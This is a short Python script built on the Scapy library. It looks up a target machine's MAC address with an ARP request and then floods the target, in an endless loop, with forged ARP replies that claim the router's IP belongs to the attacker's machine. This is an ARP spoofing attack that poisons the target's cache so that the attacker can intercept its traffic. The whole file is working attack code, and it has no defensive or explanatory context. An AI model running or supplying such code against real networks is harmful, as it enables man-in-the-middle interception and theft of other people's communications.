import scapy.all as s
s.conf.use_pcap = True
def Get_target_mac_adress(my_ip, Target_ip, my_mac):
    arp_request = s.Ether(dst="ff:ff:ff:ff:ff:ff", src= my_mac)/s.ARP(op = 1, psrc = my_ip, pdst = Target_ip, hwsrc= my_mac)
    s.sendp(arp_request)
    res = s.srp(arp_request)
    print(res)
    result, unanswered = res
    Target_mac = result[0][1].hwsrc
    return Target_mac

def send_arp_spoof(my_ip, router_ip, Target_ip, My_mac, Target_mac):
    arp_spoof = s.Ether(dst= Target_mac, src= My_mac)/s.ARP(op=2, pdst= Target_ip, psrc= router_ip, hwsrc= My_mac, hwdst= Target_mac)
    while True:
        s.sendp(arp_spoof)

